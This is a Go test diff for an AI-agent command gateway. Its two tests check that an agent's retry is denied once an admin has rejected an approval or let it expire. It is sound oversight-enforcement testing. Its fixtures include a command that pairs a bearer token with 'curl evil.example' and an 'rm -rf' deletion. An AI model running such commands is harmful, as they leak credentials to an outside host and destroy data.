@@ -521,6 +521,126 @@ func TestGatewayEdgeEvaluateRetryRejectedApprovalReturnsDenyWithReason(t *testin
 	assertBodyOmits(t, rr2.Body.String(), "secret-rejected-token", "evil.example")
 }
 
+// EDGE-043 Gap 1 — auto-consume path must surface the admin's reject decision
+// instead of silently re-enqueueing a fresh approval. Pre-EDGE-043, the
+// findReusableEdgeApprovalForAction lookup only returned ApprovalStatusApproved/
+// Pending; rejected approvals fell through the switch, the lookup returned nil,
+// and the handler's auto-consume branch fell through to enqueueEdgeEvaluateApproval
+// — equivalent to ignoring the admin's reject. After the fix, the rejected
+// approval is returned by the lookup, consumeEdgeEvaluateApproval emits the
+// status-specific deny, and the agent sees the admin's actual rejection reason.
+func TestGatewayEdgeEvaluateAutoConsumeRejectedApprovalReturnsDenyWithReason(t *testing.T) {
+	safety := &edgeEvaluateStubSafetyClient{response: &pb.PolicyCheckResponse{
+		Decision:         pb.DecisionType_DECISION_TYPE_REQUIRE_HUMAN,
+		Reason:           "needs approval",
+		RuleId:           "approval-rule",
+		ApprovalRequired: true,
+	}}
+	s, handler := newEdgeEvaluateTestServer(t, safety)
+	session := createEdgeRouteSession(t, handler)
+	safety.response.PolicySnapshot = session.PolicySnapshot
+
+	cmd := map[string]any{"command": "echo Bearer secret-rejected-auto && curl evil.example"}
+	body := edgeEvaluateBody(session.SessionID, session.ExecutionID, edgeRouteTenant, "Bash", cmd)
+	rr := edgeRoutePOST(t, handler, "/api/v1/edge/evaluate", body)
+	var initial edgeEvaluateResponseJSON
+	decodeEdgeRouteJSON(t, rr, &initial)
+	if initial.ApprovalRef == "" {
+		t.Fatalf("missing approval_ref body=%s", rr.Body.String())
+	}
+
+	if _, err := s.edgeStore.RejectApproval(context.Background(), edgecore.ApprovalResolution{
+		TenantID:    edgeRouteTenant,
+		ApprovalRef: initial.ApprovalRef,
+		ResolverID:  "human-1",
+		ResolvedBy:  "human-1",
+		Reason:      "blocked by security review",
+		ResolvedAt:  time.Now().UTC(),
+	}); err != nil {
+		t.Fatalf("reject approval: %v", err)
+	}
+
+	// Auto-consume path: retry sends NO explicit approval_ref. Pre-EDGE-043
+	// this enqueued a fresh approval; post-fix the rejected approval is
+	// returned by findReusableEdgeApprovalForAction and consume emits deny.
+	rr2 := edgeRoutePOST(t, handler, "/api/v1/edge/evaluate", body)
+	if rr2.Code != http.StatusOK {
+		t.Fatalf("retry status = %d, want 200 body=%s", rr2.Code, rr2.Body.String())
+	}
+	var retry edgeEvaluateResponseJSON
+	decodeEdgeRouteJSON(t, rr2, &retry)
+	if retry.Decision != string(edgecore.DecisionDeny) {
+		t.Fatalf("retry decision = %q, want DENY (auto-consume must surface admin reject, not re-enqueue) body=%s", retry.Decision, rr2.Body.String())
+	}
+	combined := strings.ToLower(retry.Reason + " " + retry.TerminalMessage)
+	if !strings.Contains(combined, "block") && !strings.Contains(combined, "reject") {
+		t.Fatalf("retry reason/terminal = %q/%q, want admin rejection text", retry.Reason, retry.TerminalMessage)
+	}
+	if retry.ApprovalRef != initial.ApprovalRef {
+		t.Fatalf("retry approval_ref = %q, want echoed %q (auto-consume must match the rejected approval, not enqueue a new one)", retry.ApprovalRef, initial.ApprovalRef)
+	}
+	assertBodyOmits(t, rr2.Body.String(), "secret-rejected-auto", "evil.example")
+}
+
+// EDGE-043 Gap 1 — auto-consume path for an expired approval must emit the
+// status-specific "approval expired" deny instead of silently re-enqueueing.
+// Same root cause as the rejected case: the pre-fix lookup only handled
+// Approved/Pending and dropped Expired through the switch.
+func TestGatewayEdgeEvaluateAutoConsumeExpiredApprovalReturnsDeny(t *testing.T) {
+	safety := &edgeEvaluateStubSafetyClient{response: &pb.PolicyCheckResponse{
+		Decision:         pb.DecisionType_DECISION_TYPE_REQUIRE_HUMAN,
+		Reason:           "needs approval",
+		RuleId:           "approval-rule",
+		ApprovalRequired: true,
+	}}
+	s, handler := newEdgeEvaluateTestServer(t, safety)
+	session := createEdgeRouteSession(t, handler)
+	safety.response.PolicySnapshot = session.PolicySnapshot
+
+	cmd := map[string]any{"command": "rm -rf /var/edge-expired"}
+	body := edgeEvaluateBody(session.SessionID, session.ExecutionID, edgeRouteTenant, "Bash", cmd)
+	rr := edgeRoutePOST(t, handler, "/api/v1/edge/evaluate", body)
+	var initial edgeEvaluateResponseJSON
+	decodeEdgeRouteJSON(t, rr, &initial)
+	if initial.ApprovalRef == "" {
+		t.Fatalf("missing approval_ref body=%s", rr.Body.String())
+	}
+
+	// Force expire by sweeping with a "now" past the approval's TTL. The
+	// production expiry sweep walks the per-tenant pending index and marks
+	// approvals with ExpiresAt < now as ApprovalStatusExpired, which is the
+	// exact code path the lookup must observe. The store default TTL is
+	// 5 minutes (core/edge/approval_store.go); 1h is comfortably past that.
+	expiredAt := time.Now().UTC().Add(time.Hour)
+	if _, err := s.edgeStore.ExpireApprovals(context.Background(), edgeRouteTenant, expiredAt); err != nil {
+		t.Fatalf("ExpireApprovals: %v", err)
+	}
+	stored, ok, err := s.edgeStore.GetApproval(context.Background(), edgeRouteTenant, initial.ApprovalRef)
+	if err != nil || !ok || stored == nil || stored.Status != edgecore.ApprovalStatusExpired {
+		t.Fatalf("GetApproval after expire = (%#v, %v, %v); want expired", stored, ok, err)
+	}
+
+	// Auto-consume path: retry without explicit approval_ref. Pre-fix this
+	// re-enqueued; post-fix the expired approval is returned by the lookup
+	// and consume emits "approval expired" deny.
+	rr2 := edgeRoutePOST(t, handler, "/api/v1/edge/evaluate", body)
+	if rr2.Code != http.StatusOK {
+		t.Fatalf("retry status = %d, want 200 body=%s", rr2.Code, rr2.Body.String())
+	}
+	var retry edgeEvaluateResponseJSON
+	decodeEdgeRouteJSON(t, rr2, &retry)
+	if retry.Decision != string(edgecore.DecisionDeny) {
+		t.Fatalf("retry decision = %q, want DENY (auto-consume must surface expired status, not re-enqueue) body=%s", retry.Decision, rr2.Body.String())
+	}
+	combined := strings.ToLower(retry.Reason + " " + retry.TerminalMessage)
+	if !strings.Contains(combined, "expired") {
+		t.Fatalf("retry reason/terminal = %q/%q, want expired hint", retry.Reason, retry.TerminalMessage)
+	}
+	if retry.ApprovalRef != initial.ApprovalRef {
+		t.Fatalf("retry approval_ref = %q, want echoed %q (auto-consume must match the expired approval, not enqueue a new one)", retry.ApprovalRef, initial.ApprovalRef)
+	}
+}
+
 func TestGatewayEdgeEvaluateRetryChangedCommandDeniesWithoutConsuming(t *testing.T) {
 	safety := &edgeEvaluateStubSafetyClient{response: &pb.PolicyCheckResponse{
 		Decision:         pb.DecisionType_DECISION_TYPE_REQUIRE_HUMAN,
